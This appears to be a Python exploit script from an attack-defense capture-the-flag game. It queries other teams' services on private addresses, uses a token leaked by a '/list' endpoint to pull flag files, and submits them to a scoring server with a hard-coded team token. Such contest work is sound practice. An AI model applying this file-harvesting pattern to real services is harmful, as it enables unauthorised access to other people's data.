import requests
import time
s = requests.Session()
flags=[]
teams={}
teamid=[1,2,8,5,7,4]
for i in teamid:
    addr='http://172.25.'+str(i)+'.2:31337/'
    r = s.get(addr+'/list')
    text=r.text
    token = (text.partition('\n')[0])[13:-1]
    files = text.split('\n')
    files.pop(0)
    files.reverse()
    files=files[:10]
    for file in files:
        f = s.get(addr+token+'/'+file)
        ftext=f.text
        if len(ftext)==32:
            """  for ff in flagfile:
                if ftext!=ff: """
            if ftext not in flags:
                flags.append(ftext)
            """  f = open(str(i)+".txt", "a")
                    f.write(ftext+'\n')
                    f.close() """
    teams[i]='\n'.join(flags)
   
print(flags)

for flag in flags:
    aaa = s.put('http://172.24.0.1/flags', headers={"X-Team-Token":"c7fa2845216fa209"}, data='["'+flag+'"]')
    print(aaa.text)
    
    time.sleep(1)

aaa = s.put('http://172.24.0.1/flags', headers={"X-Team-Token":"c7fa2845216fa209"}, data='["'+flags[0]+'"]')
